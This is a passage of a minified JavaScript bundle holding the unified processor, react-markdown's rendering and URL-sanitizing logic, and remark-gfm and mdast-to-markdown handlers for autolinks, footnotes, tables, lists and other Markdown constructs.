Promise(l);function l(c,d){const f=rp(t);r.run(e,f,p);function p(v,y,S){const A=y||e;v?d(v):c?c(A):o(void 0,A,S)}}}runSync(e,t){let o=!1,r;return this.run(e,t,l),DA("runSync","run",o),r;function l(c,d){qA(c),r=d,o=!0}}stringify(e,t){this.freeze();const o=rp(t),r=this.compiler||this.Compiler;return og("stringify",r),IA(e),r(e,o)}use(e,...t){const o=this.attachers,r=this.namespace;if(ig("use",this.frozen),e!=null)if(typeof e=="function")f(e,t);else if(typeof e=="object")Array.isArray(e)?d(e):c(e);else throw new TypeError("Expected usable value, not `"+e+"`");return this;function l(p){if(typeof p=="function")f(p,[]);else if(typeof p=="object")if(Array.isArray(p)){const[v,...y]=p;f(v,y)}else c(p);else throw new TypeError("Expected usable value, not `"+p+"`")}function c(p){if(!("plugins"in p)&&!("settings"in p))throw new Error("Expected usable value but received an empty preset, which is probably a mistake: presets typically come with `plugins` and sometimes with `settings`, but this has neither");d(p.plugins),p.settings&&(r.settings=Zh(!0,r.settings,p.settings))}function d(p){let v=-1;if(p!=null)if(Array.isArray(p))for(;++v<p.length;){const y=p[v];l(y)}else throw new TypeError("Expected a list of plugins, not `"+p+"`")}function f(p,v){let y=-1,S=-1;for(;++y<o.length;)if(o[y][0]===p){S=y;break}if(S===-1)o.push([p,...v]);else if(v.length>0){let[A,...R]=v;const L=o[S][1];$g(L)&&$g(A)&&(A=Zh(!0,L,A)),o[S]=[p,A,...R]}}}}const OU=new Dv().freeze();function ng(a,e){if(typeof e!="function")throw new TypeError("Cannot `"+a+"` without `parser`")}function og(a,e){if(typeof e!="function")throw new TypeError("Cannot `"+a+"` without `compiler`")}function ig(a,e){if(e)throw new Error("Cannot call `"+a+"` on a frozen processor.\nCreate a new processor first, by calling it: use `processor()` instead of `processor`.")}function IA(a){if(!$g(a)||typeof a.type!="string")throw new TypeError("Expected node, got `"+a+"`")}function DA(a,e,t){if(!t)throw new Error("`"+a+"` finished async. Use `"+e+"` instead")}function rp(a){return zU(a)?a:new Fj(a)}function zU(a){return!!(a&&typeof a=="object"&&"message"in a&&"messages"in a)}function UU(a){return typeof a=="string"||BU(a)}function BU(a){return!!(a&&typeof a=="object"&&"byteLength"in a&&"byteOffset"in a)}const VU="https://github.com/remarkjs/react-markdown/blob/main/changelog.md",wA=[],MA={allowDangerousHtml:!0},FU=/^(https?|ircs?|mailto|xmpp)$/i,HU=[{from:"astPlugins",id:"remove-buggy-html-in-markdown-parser"},{from:"allowDangerousHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"allowNode",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowElement"},{from:"allowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"allowedElements"},{from:"className",id:"remove-classname"},{from:"disallowedTypes",id:"replace-allownode-allowedtypes-and-disallowedtypes",to:"disallowedElements"},{from:"escapeHtml",id:"remove-buggy-html-in-markdown-parser"},{from:"includeElementIndex",id:"#remove-includeelementindex"},{from:"includeNodeIndex",id:"change-includenodeindex-to-includeelementindex"},{from:"linkTarget",id:"remove-linktarget"},{from:"plugins",id:"change-plugins-to-remarkplugins",to:"remarkPlugins"},{from:"rawSourcePos",id:"#remove-rawsourcepos"},{from:"renderers",id:"change-renderers-to-components",to:"components"},{from:"source",id:"change-source-to-children",to:"children"},{from:"sourcePos",id:"#remove-sourcepos"},{from:"transformImageUri",id:"#add-urltransform",to:"urlTransform"},{from:"transformLinkUri",id:"#add-urltransform",to:"urlTransform"}];function _A(a){const e=GU(a),t=JU(a);return QU(e.runSync(e.parse(t),t),a)}function GU(a){const e=a.rehypePlugins||wA,t=a.remarkPlugins||wA,o=a.remarkRehypeOptions?{...a.remarkRehypeOptions,...MA}:MA;return OU().use(jz).use(t).use(EU,o).use(e)}function JU(a){const e=a.children||"",t=new Fj;return typeof e=="string"&&(t.value=e),t}function QU(a,e){const t=e.allowedElements,o=e.allowElement,r=e.components,l=e.disallowedElements,c=e.skipHtml,d=e.unwrapDisallowed,f=e.urlTransform||WU;for(const v of HU)Object.hasOwn(e,v.from)&&(""+v.from+(v.to?"use `"+v.to+"` instead":"remove it")+VU+v.id,void 0);return Iv(a,p),cO(a,{Fragment:g.Fragment,components:r,ignoreInvalidStyle:!0,jsx:g.jsx,jsxs:g.jsxs,passKeys:!0,passNode:!0});function p(v,y,S){if(v.type==="raw"&&S&&typeof y=="number")return c?S.children.splice(y,1):S.children[y]={type:"text",value:v.value},y;if(v.type==="element"){let A;for(A in Kh)if(Object.hasOwn(Kh,A)&&Object.hasOwn(v.properties,A)){const R=v.properties[A],L=Kh[A];(L===null||L.includes(v.tagName))&&(v.properties[A]=f(String(R||""),A,v))}}if(v.type==="element"){let A=t?!t.includes(v.tagName):l?l.includes(v.tagName):!1;if(!A&&o&&typeof y=="number"&&(A=!o(v,y,S)),A&&S&&typeof y=="number")return d&&v.children?S.children.splice(y,1,...v.children):S.children.splice(y,1),y}}}function WU(a){const e=a.indexOf(":"),t=a.indexOf("?"),o=a.indexOf("#"),r=a.indexOf("/");return e===-1||r!==-1&&e>r||t!==-1&&e>t||o!==-1&&e>o||FU.test(a.slice(0,e))?a:""}function kA(a,e){const t=String(a);if(typeof e!="string")throw new TypeError("Expected character");let o=0,r=t.indexOf(e);for(;r!==-1;)o++,r=t.indexOf(e,r+e.length);return o}function KU(a){if(typeof a!="string")throw new TypeError("Expected a string");return a.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&").replace(/-/g,"\\x2d")}function $U(a,e,t){const r=Cm((t||{}).ignore||[]),l=YU(e);let c=-1;for(;++c<l.length;)Vj(a,"text",d);function d(p,v){let y=-1,S;for(;++y<v.length;){const A=v[y],R=S?S.children:void 0;if(r(A,R?R.indexOf(A):void 0,S))return;S=A}if(S)return f(p,v)}function f(p,v){const y=v[v.length-1],S=l[c][0],A=l[c][1];let R=0;const x=y.children.indexOf(p);let D=!1,G=[];S.lastIndex=0;let B=S.exec(p.value);for(;B;){const ee=B.index,ue={index:B.index,input:B.input,stack:[...v,p]};let Q=A(...B,ue);if(typeof Q=="string"&&(Q=Q.length>0?{type:"text",value:Q}:void 0),Q===!1?S.lastIndex=ee+1:(R!==ee&&G.push({type:"text",value:p.value.slice(R,ee)}),Array.isArray(Q)?G.push(...Q):Q&&G.push(Q),R=ee+B[0].length,D=!0),!S.global)break;B=S.exec(p.value)}return D?(R<p.value.length&&G.push({type:"text",value:p.value.slice(R)}),y.children.splice(x,1,...G)):G=[p],x+G.length}}function YU(a){const e=[];if(!Array.isArray(a))throw new TypeError("Expected find and replace tuple or list of tuples");const t=!a[0]||Array.isArray(a[0])?a:[a];let o=-1;for(;++o<t.length;){const r=t[o];e.push([XU(r[0]),ZU(r[1])])}return e}function XU(a){return typeof a=="string"?new RegExp(KU(a),"g"):a}function ZU(a){return typeof a=="function"?a:function(){return a}}const rg="phrasing",sg=["autolink","link","image","label"];function e4(){return{transforms:[s4],enter:{literalAutolink:t4,literalAutolinkEmail:lg,literalAutolinkHttp:lg,literalAutolinkWww:lg},exit:{literalAutolink:r4,literalAutolinkEmail:i4,literalAutolinkHttp:n4,literalAutolinkWww:o4}}}function a4(){return{unsafe:[{character:"@",before:"[+\\-.\\w]",after:"[\\-.\\w]",inConstruct:rg,notInConstruct:sg},{character:".",before:"[Ww]",after:"[\\-.\\w]",inConstruct:rg,notInConstruct:sg},{character:":",before:"[ps]",after:"\\/",inConstruct:rg,notInConstruct:sg}]}}function t4(a){this.enter({type:"link",title:null,url:"",children:[]},a)}function lg(a){this.config.enter.autolinkProtocol.call(this,a)}function n4(a){this.config.exit.autolinkProtocol.call(this,a)}function o4(a){this.config.exit.data.call(this,a);const e=this.stack[this.stack.length-1];e.type,e.url="http://"+this.sliceSerialize(a)}function i4(a){this.config.exit.autolinkEmail.call(this,a)}function r4(a){this.exit(a)}function s4(a){$U(a,[[/(https?:\/\/|www(?=\.))([-.\w]+)([^ \t\r\n]*)/gi,l4],[new RegExp("(?<=^|\\s|\\p{P}|\\p{S})([-.\\w+]+)@([-\\w]+(?:\\.[-\\w]+)+)","gu"),c4]],{ignore:["link","linkReference"]})}function l4(a,e,t,o,r){let l="";if(!Hj(r)||(/^w/i.test(e)&&(t=e+t,e="",l="http://"),!u4(t)))return!1;const c=d4(t+o);if(!c[0])return!1;const d={type:"link",title:null,url:l+e+c[0],children:[{type:"text",value:e+c[0]}]};return c[1]?[d,{type:"text",value:c[1]}]:d}function c4(a,e,t,o){return!Hj(o,!0)||/[-\d_]$/.test(t)?!1:{type:"link",title:null,url:"mailto:"+e+"@"+t,children:[{type:"text",value:e+"@"+t}]}}function u4(a){const e=a.split(".");return!(e.length<2||e[e.length-1]&&(/_/.test(e[e.length-1])||!/[a-zA-Z\d]/.test(e[e.length-1]))||e[e.length-2]&&(/_/.test(e[e.length-2])||!/[a-zA-Z\d]/.test(e[e.length-2])))}function d4(a){const e=/[!"&'),.:;<>?\]}]+$/.exec(a);if(!e)return[a,void 0];a=a.slice(0,e.index);let t=e[0],o=t.indexOf(")");const r=kA(a,"(");let l=kA(a,")");for(;o!==-1&&r>l;)a+=t.slice(0,o+1),t=t.slice(o+1),o=t.indexOf(")"),l++;return[a,t]}function Hj(a,e){const t=a.input.charCodeAt(a.index-1);return(a.index===0||$r(t)||ym(t))&&(!e||t!==47)}Gj.peek=E4;function p4(){this.buffer()}function m4(a){this.enter({type:"footnoteReference",identifier:"",label:""},a)}function f4(){this.buffer()}function h4(a){this.enter({type:"footnoteDefinition",identifier:"",label:"",children:[]},a)}function g4(a){const e=this.resume(),t=this.stack[this.stack.length-1];t.type,t.identifier=On(this.sliceSerialize(a)).toLowerCase(),t.label=e}function b4(a){this.exit(a)}function v4(a){const e=this.resume(),t=this.stack[this.stack.length-1];t.type,t.identifier=On(this.sliceSerialize(a)).toLowerCase(),t.label=e}function y4(a){this.exit(a)}function E4(){return"["}function Gj(a,e,t,o){const r=t.createTracker(o);let l=r.move("[^");const c=t.enter("footnoteReference"),d=t.enter("reference");return l+=r.move(t.safe(t.associationId(a),{after:"]",before:l})),d(),c(),l+=r.move("]"),l}function S4(){return{enter:{gfmFootnoteCallString:p4,gfmFootnoteCall:m4,gfmFootnoteDefinitionLabelString:f4,gfmFootnoteDefinition:h4},exit:{gfmFootnoteCallString:g4,gfmFootnoteCall:b4,gfmFootnoteDefinitionLabelString:v4,gfmFootnoteDefinition:y4}}}function C4(a){let e=!1;return a&&a.firstLineBlank&&(e=!0),{handlers:{footnoteDefinition:t,footnoteReference:Gj},unsafe:[{character:"[",inConstruct:["label","phrasing","reference"]}]};function t(o,r,l,c){const d=l.createTracker(c);let f=d.move("[^");const p=l.enter("footnoteDefinition"),v=l.enter("label");return f+=d.move(l.safe(l.associationId(o),{before:f,after:"]"})),v(),f+=d.move("]:"),o.children&&o.children.length>0&&(d.shift(4),f+=d.move((e?`
`:" ")+l.indentLines(l.containerFlow(o,d.current()),e?Jj:A4))),p(),f}}function A4(a,e,t){return e===0?a:Jj(a,e,t)}function Jj(a,e,t){return(t?"":"    ")+a}const T4=["autolink","destinationLiteral","destinationRaw","reference","titleQuote","titleApostrophe"];Qj.peek=R4;function x4(){return{canContainEols:["delete"],enter:{strikethrough:P4},exit:{strikethrough:q4}}}function j4(){return{unsafe:[{character:"~",inConstruct:"phrasing",notInConstruct:T4}],handlers:{delete:Qj}}}function P4(a){this.enter({type:"delete",children:[]},a)}function q4(a){this.exit(a)}function Qj(a,e,t,o){const r=t.createTracker(o),l=t.enter("strikethrough");let c=r.move("~~");return c+=t.containerPhrasing(a,{...r.current(),before:c,after:"~"}),c+=r.move("~~"),l(),c}function R4(){return"~"}function L4(a){return a.length}function I4(a,e){const t=e||{},o=(t.align||[]).concat(),r=t.stringLength||L4,l=[],c=[],d=[],f=[];let p=0,v=-1;for(;++v<a.length;){const L=[],x=[];let D=-1;for(a[v].length>p&&(p=a[v].length);++D<a[v].length;){const G=D4(a[v][D]);if(t.alignDelimiters!==!1){const B=r(G);x[D]=B,(f[D]===void 0||B>f[D])&&(f[D]=B)}L.push(G)}c[v]=L,d[v]=x}let y=-1;if(typeof o=="object"&&"length"in o)for(;++y<p;)l[y]=NA(o[y]);else{const L=NA(o);for(;++y<p;)l[y]=L}y=-1;const S=[],A=[];for(;++y<p;){const L=l[y];let x="",D="";L===99?(x=":",D=":"):L===108?x=":":L===114&&(D=":");let G=t.alignDelimiters===!1?1:Math.max(1,f[y]-x.length-D.length);const B=x+"-".repeat(G)+D;t.alignDelimiters!==!1&&(G=x.length+G+D.length,G>f[y]&&(f[y]=G),A[y]=G),S[y]=B}c.splice(1,0,S),d.splice(1,0,A),v=-1;const R=[];for(;++v<c.length;){const L=c[v],x=d[v];y=-1;const D=[];for(;++y<p;){const G=L[y]||"";let B="",ee="";if(t.alignDelimiters!==!1){const ue=f[y]-(x[y]||0),Q=l[y];Q===114?B=" ".repeat(ue):Q===99?ue%2?(B=" ".repeat(ue/2+.5),ee=" ".repeat(ue/2-.5)):(B=" ".repeat(ue/2),ee=B):ee=" ".repeat(ue)}t.delimiterStart!==!1&&!y&&D.push("|"),t.padding!==!1&&!(t.alignDelimiters===!1&&G==="")&&(t.delimiterStart!==!1||y)&&D.push(" "),t.alignDelimiters!==!1&&D.push(B),D.push(G),t.alignDelimiters!==!1&&D.push(ee),t.padding!==!1&&D.push(" "),(t.delimiterEnd!==!1||y!==p-1)&&D.push("|")}R.push(t.delimiterEnd===!1?D.join("").replace(/ +$/,""):D.join(""))}return R.join(`
`)}function D4(a){return a==null?"":String(a)}function NA(a){const e=typeof a=="string"?a.codePointAt(0):0;return e===67||e===99?99:e===76||e===108?108:e===82||e===114?114:0}function w4(a,e,t,o){const r=t.enter("blockquote"),l=t.createTracker(o);l.move("> "),l.shift(2);const c=t.indentLines(t.containerFlow(a,l.current()),M4);return r(),c}function M4(a,e,t){return">"+(t?"":" ")+a}function _4(a,e){return OA(a,e.inConstruct,!0)&&!OA(a,e.notInConstruct,!1)}function OA(a,e,t){if(typeof e=="string"&&(e=[e]),!e||e.length===0)return t;let o=-1;for(;++o<e.length;)if(a.includes(e[o]))return!0;return!1}function zA(a,e,t,o){let r=-1;for(;++r<t.unsafe.length;)if(t.unsafe[r].character===`
`&&_4(t.stack,t.unsafe[r]))return/[ \t]/.test(o.before)?"":" ";return`\\
`}function k4(a,e){const t=String(a);let o=t.indexOf(e),r=o,l=0,c=0;if(typeof e!="string")throw new TypeError("Expected substring");for(;o!==-1;)o===r?++l>c&&(c=l):l=1,r=o+e.length,o=t.indexOf(e,r);return c}function N4(a,e){return!!(e.options.fences===!1&&a.value&&!a.lang&&/[^ \r\n]/.test(a.value)&&!/^[\t ]*(?:[\r\n]|$)|(?:^|[\r\n])[\t ]*$/.test(a.value))}function O4(a){const e=a.options.fence||"`";if(e!=="`"&&e!=="~")throw new Error("Cannot serialize code with `"+e+"` for `options.fence`, expected `` ` `` or `~`");return e}function z4(a,e,t,o){const r=O4(t),l=a.value||"",c=r==="`"?"GraveAccent":"Tilde";if(N4(a,t)){const y=t.enter("codeIndented"),S=t.indentLines(l,U4);return y(),S}const d=t.createTracker(o),f=r.repeat(Math.max(k4(l,r)+1,3)),p=t.enter("codeFenced");let v=d.move(f);if(a.lang){const y=t.enter(`codeFencedLang${c}`);v+=d.move(t.safe(a.lang,{before:v,after:" ",encode:["`"],...d.current()})),y()}if(a.lang&&a.meta){const y=t.enter(`codeFencedMeta${c}`);v+=d.move(" "),v+=d.move(t.safe(a.meta,{before:v,after:`
`,encode:["`"],...d.current()})),y()}return v+=d.move(`
`),l&&(v+=d.move(l+`
`)),v+=d.move(f),p(),v}function U4(a,e,t){return(t?"":"    ")+a}function wv(a){const e=a.options.quote||'"';if(e!=='"'&&e!=="'")throw new Error("Cannot serialize title with `"+e+"` for `options.quote`, expected `\"`, or `'`");return e}function B4(a,e,t,o){const r=wv(t),l=r==='"'?"Quote":"Apostrophe",c=t.enter("definition");let d=t.enter("label");const f=t.createTracker(o);let p=f.move("[");return p+=f.move(t.safe(t.associationId(a),{before:p,after:"]",...f.current()})),p+=f.move("]: "),d(),!a.url||/[\0- \u007F]/.test(a.url)?(d=t.enter("destinationLiteral"),p+=f.move("<"),p+=f.move(t.safe(a.url,{before:p,after:">",...f.current()})),p+=f.move(">")):(d=t.enter("destinationRaw"),p+=f.move(t.safe(a.url,{before:p,after:a.title?" ":`
`,...f.current()}))),d(),a.title&&(d=t.enter(`title${l}`),p+=f.move(" "+r),p+=f.move(t.safe(a.title,{before:p,after:r,...f.current()})),p+=f.move(r),d()),c(),p}function V4(a){const e=a.options.emphasis||"*";if(e!=="*"&&e!=="_")throw new Error("Cannot serialize emphasis with `"+e+"` for `options.emphasis`, expected `*`, or `_`");return e}function lu(a){return"&#x"+a.toString(16).toUpperCase()+";"}function Xp(a,e,t){const o=ll(a),r=ll(e);return o===void 0?r===void 0?t==="_"?{inside:!0,outside:!0}:{inside:!1,outside:!1}:r===1?{inside:!0,outside:!0}:{inside:!1,outside:!0}:o===1?r===void 0?{inside:!1,outside:!1}:r===1?{inside:!0,outside:!0}:{inside:!1,outside:!1}:r===void 0?{inside:!1,outside:!1}:r===1?{inside:!0,outside:!1}:{inside:!1,outside:!1}}Wj.peek=F4;function Wj(a,e,t,o){const r=V4(t),l=t.enter("emphasis"),c=t.createTracker(o),d=c.move(r);let f=c.move(t.containerPhrasing(a,{after:r,before:d,...c.current()}));const p=f.charCodeAt(0),v=Xp(o.before.charCodeAt(o.before.length-1),p,r);v.inside&&(f=lu(p)+f.slice(1));const y=f.charCodeAt(f.length-1),S=Xp(o.after.charCodeAt(0),y,r);S.inside&&(f=f.slice(0,-1)+lu(y));const A=c.move(r);return l(),t.attentionEncodeSurroundingInfo={after:S.outside,before:v.outside},d+f+A}function F4(a,e,t){return t.options.emphasis||"*"}function H4(a,e){let t=!1;return Iv(a,function(o){if("value"in o&&/\r?\n|\r/.test(o.value)||o.type==="break")return t=!0,Wg}),!!((!a.depth||a.depth<3)&&Tv(a)&&(e.options.setext||t))}function G4(a,e,t,o){const r=Math.max(Math.min(6,a.depth||1),1),l=t.createTracker(o);if(H4(a,t)){const v=t.enter("headingSetext"),y=t.enter("phrasing"),S=t.containerPhrasing(a,{...l.current(),before:`
`,after:`
`});return y(),v(),S+`
`+(r===1?"=":"-").repeat(S.length-(Math.max(S.lastIndexOf("\r"),S.lastIndexOf(`
`))+1))}const c="#".repeat(r),d=t.enter("headingAtx"),f=t.enter("phrasing");l.move(c+" ");let p=t.containerPhrasing(a,{before:"# ",after:`
`,...l.current()});return/^[\t ]/.test(p)&&(p=lu(p.charCodeAt(0))+p.slice(1)),p=p?c+" "+p:c,t.options.closeAtx&&(p+=" "+c),f(),d(),p}Kj.peek=J4;function Kj(a){return a.value||""}function J4(){return"<"}$j.peek=Q4;function $j(a,e,t,o){const r=wv(t),l=r==='"'?"Quote":"Apostrophe",c=t.enter("image");let d=t.enter("label");const f=t.createTracker(o);let p=f.move("![");return p+=f.move(t.safe(a.alt,{before:p,after:"]",...f.current()})),p+=f.move("]("),d(),!a.url&&a.title||/[\0- \u007F]/.test(a.url)?(d=t.enter("destinationLiteral"),p+=f.move("<"),p+=f.move(t.safe(a.url,{before:p,after:">",...f.current()})),p+=f.move(">")):(d=t.enter("destinationRaw"),p+=f.move(t.safe(a.url,{before:p,after:a.title?" ":")",...f.current()}))),d(),a.title&&(d=t.enter(`title${l}`),p+=f.move(" "+r),p+=f.move(t.safe(a.title,{before:p,after:r,...f.current()})),p+=f.move(r),d()),p+=f.move(")"),c(),p}function Q4(){return"!"}Yj.peek=W4;function Yj(a,e,t,o){const r=a.referenceType,l=t.enter("imageReference");let c=t.enter("label");const d=t.createTracker(o);let f=d.move("![");const p=t.safe(a.alt,{before:f,after:"]",...d.current()});f+=d.move(p+"]["),c();const v=t.stack;t.stack=[],c=t.enter("reference");const y=t.safe(t.associationId(a),{before:f,after:"]",...d.current()});return c(),t.stack=v,l(),r==="full"||!p||p!==y?f+=d.move(y+"]"):r==="shortcut"?f=f.slice(0,-1):f+=d.move("]"),f}function W4(){return"!"}Xj.peek=K4;function Xj(a,e,t){let o=a.value||"",r="`",l=-1;for(;new RegExp("(^|[^`])"+r+"([^`]|$)").test(o);)r+="`";for(/[^ \r\n]/.test(o)&&(/^[ \r\n]/.test(o)&&/[ \r\n]$/.test(o)||/^`|`$/.test(o))&&(o=" "+o+" ");++l<t.unsafe.length;){const c=t.unsafe[l],d=t.compilePattern(c);let f;if(c.atBreak)for(;f=d.exec(o);){let p=f.index;o.charCodeAt(p)===10&&o.charCodeAt(p-1)===13&&p--,o=o.slice(0,p)+" "+o.slice(f.index+1)}}return r+o+r}function K4(){return"`"}function Zj(a,e){const t=Tv(a);return!!(!e.options.resourceLink&&a.url&&!a.title&&a.children&&a.children.length===1&&a.children[0].type==="text"&&(t===a.url||"mailto:"+t===a.url)&&/^[a-z][a-z+.-]+:/i.test(a.url)&&!/[\0- <>\u007F]/.test(a.url))}eP.peek=$4;function eP(a,e,t,o){const r=wv(t),l=r==='"'?"Quote":"Apostrophe",c=t.createTracker(o);let d,f;if(Zj(a,t)){const v=t.stack;t.stack=[],d=t.enter("autolink");let y=c.move("<");return y+=c.move(t.containerPhrasing(a,{before:y,after:">",...c.current()})),y+=c.move(">"),d(),t.stack=v,y}d=t.enter("link"),f=t.enter("label");let p=c.move("[");return p+=c.move(t.containerPhrasing(a,{before:p,after:"](",...c.current()})),p+=c.move("]("),f(),!a.url&&a.title||/[\0- \u007F]/.test(a.url)?(f=t.enter("destinationLiteral"),p+=c.move("<"),p+=c.move(t.safe(a.url,{before:p,after:">",...c.current()})),p+=c.move(">")):(f=t.enter("destinationRaw"),p+=c.move(t.safe(a.url,{before:p,after:a.title?" ":")",...c.current()}))),f(),a.title&&(f=t.enter(`title${l}`),p+=c.move(" "+r),p+=c.move(t.safe(a.title,{before:p,after:r,...c.current()})),p+=c.move(r),f()),p+=c.move(")"),d(),p}function $4(a,e,t){return Zj(a,t)?"<":"["}aP.peek=Y4;function aP(a,e,t,o){const r=a.referenceType,l=t.enter("linkReference");let c=t.enter("label");const d=t.createTracker(o);let f=d.move("[");const p=t.containerPhrasing(a,{before:f,after:"]",...d.current()});f+=d.move(p+"]["),c();const v=t.stack;t.stack=[],c=t.enter("reference");const y=t.safe(t.associationId(a),{before:f,after:"]",...d.current()});return c(),t.stack=v,l(),r==="full"||!p||p!==y?f+=d.move(y+"]"):r==="shortcut"?f=f.slice(0,-1):f+=d.move("]"),f}function Y4(){return"["}function Mv(a){const e=a.options.bullet||"*";if(e!=="*"&&e!=="+"&&e!=="-")throw new Error("Cannot serialize items with `"+e+"` for `options.bullet`, expected `*`, `+`, or `-`");return e}function X4(a){const e=Mv(a),t=a.options.bulletOther;if(!t)return e==="*"?"-":"*";if(t!=="*"&&t!=="+"&&t!=="-")throw new Error("Cannot serialize items with `"+t+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(t===e)throw new Error("Expected `bullet` (`"+e+"`) and `bulletOther` (`"+t+"`) to be different");return t}function Z4(a){const e=a.options.bulletOrdered||".";if(e!=="."&&e!==")")throw new Error("Cannot serialize items with `"+e+"` for `options.bulletOrdered`, expected `.` or `)`");return e}function tP(a){const e=a.options.rule||"*";if(e!=="*"&&e!=="-"&&e!=="_")throw new Error("Cannot serialize rules with `"+e+"` for `options.rule`, expected `*`, `-`, or `_`");return e}function eB(a,e,t,o){const r=t.enter("list"),l=t.bulletCurrent;let c=a.ordered?Z4(t):Mv(t);const d=a.ordered?c==="."?")":".":X4(t);let f=e&&t.bulletLastUsed?c===t.bulletLastUsed:!1;if(!a.ordered){const v=a.children?a.children[0]:void 0;if((c==="*"||c==="-")&&v&&(!v.children||!v.children[0])&&t.stack[t.stack.length-1]==="list"&&t.stack[t.stack.length-2]==="listItem"&&t.stack[t.stack.length-3]==="list"&&t.stack[t.stack.length-4]==="listItem"&&t.indexStack[t.indexStack.length-1]===0&&t.indexStack[t.indexStack.length-2]===0&&t.indexStack[t.indexStack.length-3]===0&&(f=!0),tP(t)===c&&v){let y=-1;for(;++y<a.children.length;){const S=a.children[y];if(S&&S.type==="listItem"&&S.children&&S.children[0]&&S.children[0].type==="thematicBreak"){f=!0;break}}}}f&&(c=d),t.bulletCurrent=c;const p=t.containerFlow(a,o);return t.bulletLastUsed=c,t.bulletCurrent=l,r(),p}function aB(a){const e=a.options.listItemIndent||"one";if(e!=="tab"&&e!=="one"&&e!=="mixed")throw new Error("Cannot serialize items with `"+e+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return e}function tB(a,e,t,o){const r=aB(t);let l=t.bulletCurrent||Mv(t);e&&e.type==="list"&&e.ordered&&(l=(typeof e.start=="number"&&e.start>-1?e.start:1)+(t.options.incrementListMarker===!1?0:e.children.indexOf(a))+l);let c=l.length+1;(r==="tab"||r==="mixed"&&(e&&e.type==="list"&&e.spread||a.spread))&&(c=Math.ceil(c/4)*4);const d=t.createTracker(o);d.move(l+" ".repeat(c-l.length)),d.shift(c);const f=t.enter("listItem"),p=t.indentLines(t.containerFlow(a,d.current()),v);return f(),p;function v(y,S,A){return S?(A?"":" ".repeat(c))+y:(A?l:l+" ".repeat(c-l.length))+y}}function nB(a,e,t,o){const r=t.enter("paragraph"),l=t.enter("phrasing"),c=t.containerPhrasing(a,o);return l(),r(),c}const oB=Cm(["break","delete","emphasis","footnote","footnoteReference","image","imageReference","inlineCode","inlineMath","link","linkReference","mdxJsxTextElement","mdxTextExpression","strong","text","textDirective"]);function iB(a,e,t,o){return(a.children.some(function(c){return oB(c)})?t.containerPhrasing:t.containerFlow).call(t,a,o)}function rB(a){const e=a.options.strong||"*";if(e!=="*"&&e!=="_")throw new Error("Cannot serialize strong with `"+e+"` for `options.strong`, expected `*`, or `_`");return e}nP.peek=sB;function nP(a,e,t,o){const r=rB(t),l=t.enter("strong"),c=t.createTracker(o),d=c.move(r+r);let f=c.move(t.containerPhrasing(a,{after:r,before:d,...c.current()}));const p=f.charCodeAt(0),v=Xp(o.before.charCodeAt(o.before.length-1),p,r);v.inside&&(f=lu(p)+f.slice(1));const y=f.charCodeAt(f.length-1),S=Xp(o.after.charCodeAt(0),y,r);S.inside&&(f=f.slice(0,-1)+lu(y));const A=c.move(r+r);return l(),t.attentionEncodeSurroundingInfo={after:S.outside,before:v.outside},d+f+A}function sB(a,e,t){return t.options.strong||"*"}function lB(a,e,t,o){return t.safe(a.value,o)}function cB(a){const e=a.options.ruleRepetition||3;if(e<3)throw new Error("Cannot serialize rules with repetition `"+e+"` for `options.ruleRepetition`, expected `3` or more");return e}function uB(a,e,t){const o=(tP(t)+(t.options.ruleSpaces?" ":"")).repeat(cB(t));return t.options.ruleSpaces?o.slice(0,-1):o}const oP={blockquote:w4,break:zA,code:z4,definition:B4,emphasis:Wj,hardBreak:zA,heading:G4,html:Kj,image:$j,imageReference:Yj,inlineCode:Xj,link:eP,linkReference:aP,list:eB,listItem:tB,paragraph:nB,root:iB,strong:nP,text:lB,thematicBreak:uB};function dB(){return{enter:{table:pB,tableData:UA,tableHeader:UA,tableRow:fB},exit:{codeText:hB,table:mB,tableData:cg,tableHeader:cg,tableRow:cg}}}function pB(a){const e=a._align;this.enter({type:"table",align:e.map(function(t){return t==="none"?null:t}),children:[]},a),this.data.inTable=!0}function mB(a){this.exit(a),this.data.inTable=void 0}function fB(a){this.enter({type:"tableRow",children:[]},a)}function cg(a){this.exit(a)}function UA(a){this.enter({type:"tableCell",children:[]},a)}function hB(a){let e=this.resume();this.data.inTable&&(e=e.replace(/\\([\\|])/g,gB));const t=this.stack[this.stack.length-1];t.type,t.value=e,this.exit(a)}function gB(a,e){return e==="|"?e:a}function bB(a){const e=a||{},t=e.tableCellPadding,o=e.tablePipeAlign,r=e.stringLength,l=t?" ":"|";return{unsafe:[{character:"\r",inConstruct:"tableCell"},{character:`
`,inConstruct:"tableCell"},{atBreak:!0,character:"|",after:"[	 :-]"},{character:"|",inConstruct:"tableCell"},{atBreak:!0,character:":",after:"-"},{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{inlineCode:S,table:c,tableCell:f,tableRow:d}};function c(A,R,L,x){return p(v(A,L,x),A.align)}function d(A,R,L,x){const D=y(A,L,x),G=p([D]);return G.slice(0,G.indexOf(`
`))}function f(A,R,L,x){const D=L.enter("tableCell"),G=L.enter("phrasing"),B=L.containerPhrasing(A,{...x,before:l,after:l});return G(),D(),B}function p(A,R){return I4(A,{align:R,alignDelimiters:o,padding:t,stringLength:r})}function v(A,R,L){const x=A.children;let D=-1;const G=[],B=R.enter("table");for(;++D<x.length;)G[D]=y(x[D],R,L);return B(),G}function y(A,R,L){const x=A.children;let D=-1;const G=[],B=R.enter("tableRow");for(;++D<x.length;)G[D]=f(x[D],A,R,L);return B(),G}function S(A,R,L){let x=oP.inlineCode(A,R,L);return L.stack.includes("tableCell")&&(x=x.replace(/\|/g,"\\$&")),x}}function vB(){return{exit:{taskListCheckValueChecked:BA,taskListCheckValueUnchecked:BA,paragraph:EB}}}function yB(){return{unsafe:[{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{listItem:SB}}}function BA(a){const e=this.stack[this.stack.length-2];e.type,e.checked=a.type==="taskListCheckValueChecked"}function EB(a){const e=this.stack[this.stack.length-2];if(e&&e.type==="listItem"&&typeof e.checked=="boolean"){const t=this.stack[this.stack.length-1];t.type;const o=t.children[0];if(o&&o.type==="text"){const r=e.children;let l=-1,c;for(;++l<r.length;){const d=r[l];if(d.type==="paragraph"){c=d;break}}c===t&&(o.value=o.value.slice(1),o.value.length===0?t.children.shift():t.position&&o.position&&typeof 